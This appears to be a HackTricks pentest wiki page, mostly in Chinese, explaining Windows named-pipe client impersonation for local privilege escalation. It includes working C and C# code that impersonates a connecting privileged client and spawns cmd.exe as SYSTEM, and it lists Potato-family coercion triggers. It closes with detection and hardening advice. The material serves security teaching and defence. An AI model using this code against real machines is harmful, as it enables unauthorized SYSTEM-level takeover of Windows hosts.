# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation 是一种本地权限提升原语，允许 named-pipe 服务端线程采用连接到它的客户端的安全上下文。实际上，能够以 SeImpersonatePrivilege 运行代码的攻击者可以强制具有更高权限的客户端（例如 SYSTEM 服务）连接到攻击者控制的管道，调用 ImpersonateNamedPipeClient，将得到的 token 复制为 primary token，并以该客户端的身份生成进程（通常是 NT AUTHORITY\SYSTEM）。

本页聚焦于核心技术。关于将 SYSTEM 强制连接到你的管道的端到端利用链，请参见下面引用的 Potato 家族页面。

## 要点
- 创建一个 named pipe：\\.\pipe\<random> 并等待连接。
- 让一个有特权的组件连接到它（spooler/DCOM/EFSRPC/等）。
- 从管道读取至少一条消息，然后调用 ImpersonateNamedPipeClient。
- 从当前线程打开模拟 token，执行 DuplicateTokenEx(TokenPrimary)，并使用 CreateProcessWithTokenW/CreateProcessAsUser 来获得 SYSTEM 进程。

## 要求和关键 API
- 调用进程/线程通常需要的权限：
- SeImpersonatePrivilege：用于成功模拟连接的客户端并使用 CreateProcessWithTokenW。
- 或者，在模拟 SYSTEM 之后，可以使用 CreateProcessAsUser，这可能需要 SeAssignPrimaryTokenPrivilege 和 SeIncreaseQuotaPrivilege（当你在模拟 SYSTEM 时，这些权限已满足）。
- 使用的核心 API：
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（在模拟之前必须至少读取一条消息）
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- 模拟级别：要在本地执行有用操作，客户端必须允许 SecurityImpersonation（这是许多本地 RPC/命名管道客户端的默认设置）。客户端在打开管道时可以使用 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 来降低此级别。

## 最小 Win32 工作流程 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
- 如果 ImpersonateNamedPipeClient 返回 ERROR_CANNOT_IMPERSONATE (1368)，请确保先从管道读取，并且客户端没有将 impersonation 限制为 Identification 级别。
- 更推荐使用 DuplicateTokenEx 并指定 SecurityImpersonation 和 TokenPrimary 来创建适合进程创建的主令牌。

## .NET 快速示例
在 .NET 中，NamedPipeServerStream 可以通过 RunAsClient 进行 impersonate。模拟后，复制线程令牌并创建进程。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
这些技术会强制特权服务连接到你的 named pipe，以便你可以冒充它们：
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Troubleshooting and gotchas
- 在调用 ImpersonateNamedPipeClient 之前，必须至少从 pipe 读取一条消息；否则会得到 ERROR_CANNOT_IMPERSONATE (1368)。
- 如果客户端以 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 连接，服务端无法完全冒充；通过 GetTokenInformation(TokenImpersonationLevel) 检查令牌的冒充级别。
- CreateProcessWithTokenW 要求调用者具有 SeImpersonatePrivilege。如果失败并返回 ERROR_PRIVILEGE_NOT_HELD (1314)，在你已经冒充为 SYSTEM 后使用 CreateProcessAsUser。
- 如果你加固了 pipe，请确保 pipe 的安全描述符允许目标服务连接；默认情况下，位于 \\.\pipe 下的 pipes 的访问取决于服务器的 DACL。

## Detection and hardening
- 监控 named pipe 的创建和连接。Sysmon Event IDs 17 (Pipe Created) 和 18 (Pipe Connected) 可用于基线合法 pipe 名称，并检测在令牌操作事件之前出现的不寻常、看起来随机的 pipes。
- 查找这样的序列：进程创建一个 pipe，SYSTEM 服务连接，然后创建该 pipe 的进程以 SYSTEM 身份生成子进程。
- 通过从非必要的服务账户移除 SeImpersonatePrivilege 并避免不必要的高权限服务登录来减少暴露面。
- 防御性开发：在连接不受信任的 named pipes 时，指定 SECURITY_SQOS_PRESENT 与 SECURITY_IDENTIFICATION，以防止服务端在非必要情况下完全冒充客户端。

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
